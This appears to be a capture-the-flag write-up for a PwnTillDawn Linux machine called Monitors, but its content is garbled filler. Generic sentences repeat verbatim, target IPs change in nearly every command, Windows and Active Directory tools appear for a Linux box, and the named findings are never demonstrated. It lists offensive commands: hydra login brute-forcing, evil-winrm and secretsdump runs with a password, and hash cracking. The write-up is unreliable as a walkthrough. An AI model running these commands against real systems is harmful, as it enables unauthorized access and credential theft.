---
TitleSEO: "PwnTillDawn — Monitors (Medium Linux) | ZureFX"
TitlePost: "PwnTillDawn — Monitors (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Monitors. NFS No Root Squash and Writable PATH to achieve medium compromise on Linux."
Keywords: "web, active directory, hackthebox, easy, ctf, tryhackme, medium"
URL: "https://zurefx.github.io/writeups/htb-monitors-220.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-monitors-220/"
Date: "2024-12-24"
Tags: "Web, Active Directory, HackTheBox, Easy, CTF, TryHackMe, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-monitors-220"
Permalink: "/writeups/htb-monitors-220.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Monitors** is rated **Medium** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.18.32.28`.

### Objectives

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.240.212 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.73.30.149/FUZZ
```

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.135.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.73.30.42 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.2.42 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

### Web Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.21.74.143 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p3389,8080,389 10.10.28.206 -oN scan.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **NFS No Root Squash**.

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.106.172.95 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.35.249.64/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

```bash
nmap -sCV -p143,8080,5432 10.10.178.164 -oN scan.txt
evil-winrm -i 10.76.195.226 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.85.137.7/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.82.18
```

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `sharphound`
- `pwncat`
- `hydra`
- `ldapsearch`
- `kerbrute`
- `evil-winrm`

### Key Takeaways

- NFS No Root Squash
- Writable PATH
- XSS
- SUID Binary
